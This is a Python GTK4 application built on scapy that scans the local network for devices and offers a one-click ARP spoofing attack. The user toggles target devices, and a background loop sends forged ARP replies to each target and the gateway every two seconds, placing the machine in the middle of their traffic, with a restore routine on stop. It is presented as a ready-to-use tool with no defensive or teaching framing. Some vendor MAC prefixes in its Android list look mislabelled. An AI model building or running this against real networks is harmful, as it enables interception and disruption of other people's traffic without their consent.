import gi
gi.require_version('Gtk', '4.0')
from gi.repository import Gtk, GLib, Gio

import scapy.all as scapy
import time
import threading
import ipaddress
import netifaces
import subprocess
import re
import logging
from datetime import datetime
import concurrent.futures
import socket

class NetworkTool(Gtk.Application):
    def __init__(self):
        super().__init__(application_id="com.example.NetworkTool")
        self.connect('activate', self.on_activate)
        self.is_scanning = False
        self.is_spoofing = False
        self.devices = []
        self.setup_logging()
        self.network = self.get_local_network()
        self.gateway_ip = self.get_default_gateway()
        self.log_message(f"Network set to: {self.network}", logging.DEBUG)
        self.log_message(f"Gateway IP set to: {self.gateway_ip}", logging.DEBUG)
        self.thread_count = 30  # Default thread count

    def setup_logging(self):
        self.logger = logging.getLogger('NetworkTool')
        self.logger.setLevel(logging.INFO)
        formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
        
        # Console handler
        console_handler = logging.StreamHandler()
        console_handler.setFormatter(formatter)
        self.logger.addHandler(console_handler)

    def log_message(self, message, level=logging.INFO):
        self.logger.log(level, message)
        if hasattr(self, 'status_label'):
            GLib.idle_add(self.update_status_label, message)

    def update_status_label(self, message):
        if hasattr(self, 'status_label'):
            self.status_label.set_text(f"Status: {message}")

    def get_local_network(self):
        try:
            gateways = netifaces.gateways()
            default_gateway = gateways['default'][netifaces.AF_INET][0]
            for interface in netifaces.interfaces():
                addrs = netifaces.ifaddresses(interface)
                if netifaces.AF_INET in addrs:
                    for addr in addrs[netifaces.AF_INET]:
                        ip_address = addr['addr']
                        netmask = addr['netmask']
                        if ipaddress.ip_address(default_gateway) in ipaddress.ip_network(f"{ip_address}/{netmask}", strict=False):
                            self.log_message(f"Detected local network: {ip_address}/{netmask}")
                            return f"{ip_address}/{netmask}"
        except Exception as e:
            self.log_message(f"Error detecting network: {e}", logging.ERROR)
        return None

    def get_default_gateway(self):
        try:
            gateways = netifaces.gateways()
            default_gateway = gateways['default'][netifaces.AF_INET][0]
            self.log_message(f"Detected default gateway: {default_gateway}")
            return default_gateway
        except Exception as e:
            self.log_message(f"Error detecting default gateway: {e}", logging.ERROR)
            return None

    def on_activate(self, app):
        self.window = Gtk.ApplicationWindow(application=app, title="Network Tool")
        self.window.set_default_size(600, 400)

        box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL, spacing=6)
        self.window.set_child(box)

        # Network info and scan button
        info_box = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL, spacing=6)
        box.append(info_box)

        self.network_label = Gtk.Label(label=f"Network: {self.network}")
        info_box.append(self.network_label)

        self.refresh_button = Gtk.Button(label="Refresh Devices")
        self.refresh_button.connect("clicked", self.on_refresh_clicked)
        info_box.append(self.refresh_button)

        # Device list
        self.device_store = Gtk.ListStore(str, str, str, bool)
        self.device_view = Gtk.TreeView(model=self.device_store)
        
        ip_renderer = Gtk.CellRendererText()
        ip_column = Gtk.TreeViewColumn("IP", ip_renderer, text=0)
        self.device_view.append_column(ip_column)

        mac_renderer = Gtk.CellRendererText()
        mac_column = Gtk.TreeViewColumn("MAC", mac_renderer, text=1)
        self.device_view.append_column(mac_column)

        hostname_renderer = Gtk.CellRendererText()
        hostname_column = Gtk.TreeViewColumn("Hostname", hostname_renderer, text=2)
        self.device_view.append_column(hostname_column)

        spoof_renderer = Gtk.CellRendererToggle()
        spoof_renderer.connect("toggled", self.on_spoof_toggled)
        spoof_column = Gtk.TreeViewColumn("Spoof", spoof_renderer, active=3)
        self.device_view.append_column(spoof_column)

        scrolled_window = Gtk.ScrolledWindow()
        scrolled_window.set_vexpand(True)
        scrolled_window.set_child(self.device_view)
        box.append(scrolled_window)

        # ARP spoofing section
        spoof_box = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL, spacing=6)
        box.append(spoof_box)

        gateway_label = Gtk.Label(label=f"Gateway: {self.gateway_ip}")
        spoof_box.append(gateway_label)

        self.spoof_button = Gtk.Button(label="Start Spoofing")
        self.spoof_button.connect("clicked", self.on_spoof_clicked)
        spoof_box.append(self.spoof_button)

        self.status_label = Gtk.Label(label="Status: Idle")
        box.append(self.status_label)

        # Add thread count setting
        thread_box = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL, spacing=6)
        box.append(thread_box)

        thread_label = Gtk.Label(label="Threads:")
        thread_box.append(thread_label)

        self.thread_entry = Gtk.Entry()
        self.thread_entry.set_text(str(self.thread_count))
        self.thread_entry.connect("changed", self.on_thread_count_changed)
        thread_box.append(self.thread_entry)

        self.window.present()

        # Start initial scan
        self.start_scan()

    def on_thread_count_changed(self, entry):
        try:
            self.thread_count = int(entry.get_text())
            self.log_message(f"Thread count set to {self.thread_count}")
        except ValueError:
            self.log_message("Invalid thread count. Using default.", logging.WARNING)
            self.thread_count = 30
            entry.set_text(str(self.thread_count))

    def start_scan(self):
        if not self.is_scanning and self.network:
            self.is_scanning = True
            self.log_message("Scanning network...")
            threading.Thread(target=self.scan_network, daemon=True).start()

    def on_refresh_clicked(self, button):
        self.start_scan()

    def scan_network(self):
        try:
            self.devices = []
            # First, try ARP scan
            self.arp_scan()
            
            # If ARP scan didn't find any devices, try ping scan
            if not self.devices:
                self.log_message("ARP scan found no devices. Trying ping scan...", logging.DEBUG)
                self.ping_scan()

            GLib.idle_add(self.update_device_list)
        except Exception as e:
            self.log_message(f"Error during network scan: {str(e)}", logging.ERROR)
        finally:
            self.log_message(f"Scan completed. Found {len(self.devices)} devices.")
            self.is_scanning = False

    def arp_scan(self):
        try:
            self.log_message(f"Starting ARP scan on network: {self.network}", logging.DEBUG)
            arp_request = scapy.ARP(pdst=self.network)
            broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast/arp_request
            answered_list = scapy.srp(arp_request_broadcast, timeout=3, verbose=False)[0]
            
            for element in answered_list:
                self.devices.append({'ip': element[1].psrc, 'mac': element[1].hwsrc})
            self.log_message(f"ARP scan completed. Found {len(self.devices)} devices.")
        except Exception as e:
            self.log_message(f"ARP scan error: {e}", logging.ERROR)

    def ping_scan(self):
        try:
            self.log_message(f"Starting ping scan on network: {self.network}", logging.DEBUG)
            network = ipaddress.ip_network(self.network, strict=False)
            ip_list = list(network.hosts())
            
            with concurrent.futures.ThreadPoolExecutor(max_workers=self.thread_count) as executor:
                futures = [executor.submit(self.ping_and_get_mac, str(ip)) for ip in ip_list]
                for future in concurrent.futures.as_completed(futures):
                    result = future.result()
                    if result:
                        self.devices.append(result)
            
            self.log_message(f"Ping scan completed. Found {len(self.devices)} devices.")
        except Exception as e:
            self.log_message(f"Ping scan error: {e}", logging.ERROR)

    def ping_and_get_mac(self, ip):
        try:
            self.log_message(f"Pinging {ip}", logging.DEBUG)
            result = subprocess.run(['ping', '-c', '1', '-W', '1', ip], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            if result.returncode == 0:
                mac = self.get_mac_address(ip)
                device_info = self.get_hostname(ip)
                if mac:
                    return {'ip': ip, 'mac': mac, 'hostname': device_info}
        except Exception as e:
            self.log_message(f"Error pinging {ip}: {e}", logging.ERROR)
        return None

    def get_mac_address(self, ip):
        try:
            self.log_message(f"Getting MAC address for {ip}", logging.DEBUG)
            result = subprocess.run(['arp', '-n', ip], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            mac = re.search(r"(([a-f\d]{1,2}\:){5}[a-f\d]{1,2})", result.stdout)
            return mac.group(0) if mac else "Unknown"
        except Exception as e:
            self.log_message(f"Error getting MAC address for {ip}: {e}", logging.ERROR)
            return "Unknown"

    def get_hostname(self, ip):
        try:
            # Try reverse DNS lookup first
            hostname = socket.gethostbyaddr(ip)[0]
            return hostname
        except socket.herror:
            try:
                # If reverse DNS fails, try using the 'nmblookup' command (for Windows devices)
                result = subprocess.run(['nmblookup', '-A', ip], capture_output=True, text=True, timeout=1)
                lines = result.stdout.split('\n')
                for line in lines:
                    if '<00>' in line and 'ACTIVE' in line:
                        return line.split()[0].strip()
            except (subprocess.SubprocessError, IndexError, FileNotFoundError):
                pass
            
            try:
                # If nmblookup fails or isn't available, try using 'arp -a' to get the MAC address
                result = subprocess.run(['arp', '-a', ip], capture_output=True, text=True, timeout=1)
                mac = result.stdout.split()[-1]
                if ':' in mac or '-' in mac:
                    # Check if it's likely an Android device based on MAC address
                    if self.is_android_mac(mac):
                        return f"Android Device ({mac})"
                    return f"Device ({mac})"
            except (subprocess.SubprocessError, IndexError):
                pass
            
            # If all else fails, return a generic name
            return f"Device at {ip}"

    def is_android_mac(self, mac):
        # List of common Android device manufacturers' MAC prefixes
        android_prefixes = [
            '00:08:22',  # Samsung
            '00:18:82',  # Huawei
            '00:1E:42',  # Xiaomi
            '00:24:E4',  # Sony Mobile
            '00:26:E8',  # Oppo
            '00:37:6D',  # OnePlus
            '00:6B:8E',  # Vivo
            '00:9A:CD',  # Lenovo
            '00:E0:4C',  # Realme
            '0C:37:DC',  # Motorola
            '18:F0:E4',  # Google
            '28:6C:07',  # LG
            '3C:5A:B4',  # Google
            '40:4E:36',  # HTC
            '44:80:EB',  # Google
            '60:21:C0',  # Motorola
            '70:3A:CB',  # Google
            '88:B4:A6',  # Huawei
            'A4:70:D6',  # Motorola
            'AC:37:43',  # HTC
            'D8:55:A3',  # Google
            'F0:79:59',  # Asus
        ]
        
        mac_prefix = mac[:8].upper()
        return any(mac_prefix.startswith(prefix.upper()) for prefix in android_prefixes)

    def update_device_list(self):
        self.device_store.clear()
        for device in self.devices:
            self.device_store.append([device['ip'], device['mac'], device['hostname'], False])


    def on_spoof_toggled(self, widget, path):
        self.device_store[path][3] = not self.device_store[path][3]

    def on_spoof_clicked(self, button):
        if not self.is_spoofing:
            if self.gateway_ip:
                self.is_spoofing = True
                self.spoof_button.set_label("Stop Spoofing")
                self.log_message("Starting ARP spoofing...")
                threading.Thread(target=self.spoof, daemon=True).start()
            else:
                self.log_message("Cannot start spoofing: No gateway detected", logging.ERROR)
        else:
            self.is_spoofing = False
            self.spoof_button.set_label("Start Spoofing")
            self.log_message("Stopping ARP spoofing...")

    def get_mac(self, ip):
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast/arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
        return answered_list[0][1].hwsrc

    def spoof(self):
        try:
            gateway_mac = self.get_mac(self.gateway_ip)
            self.log_message(f"Gateway MAC: {gateway_mac}")
            
            while self.is_spoofing:
                for row in self.device_store:
                    if row[3]:  # If spoofing is enabled for this device
                        target_ip = row[0]
                        target_mac = row[1]
                        # Spoof target
                        scapy.send(scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=self.gateway_ip), verbose=False)
                        # Spoof gateway
                        scapy.send(scapy.ARP(op=2, pdst=self.gateway_ip, hwdst=gateway_mac, psrc=target_ip), verbose=False)
                self.log_message("ARP spoofing in progress...", logging.DEBUG)
                time.sleep(2)

            self.restore_network()
        except Exception as e:
            self.log_message(f"Error during ARP spoofing: {str(e)}", logging.ERROR)

    def restore_network(self):
        try:
            gateway_mac = self.get_mac(self.gateway_ip)
            for row in self.device_store:
                if row[3]:  # If spoofing was enabled for this device
                    target_ip = row[0]
                    target_mac = row[1]
                    # Restore target
                    scapy.send(scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=self.gateway_ip, hwsrc=gateway_mac), count=4, verbose=False)
                    # Restore gateway
                    scapy.send(scapy.ARP(op=2, pdst=self.gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac), count=4, verbose=False)
            self.log_message("Network restored to normal state.")
        except Exception as e:
            self.log_message(f"Error restoring network: {str(e)}", logging.ERROR)

if __name__ == "__main__":
    app = NetworkTool()
    app.run(None)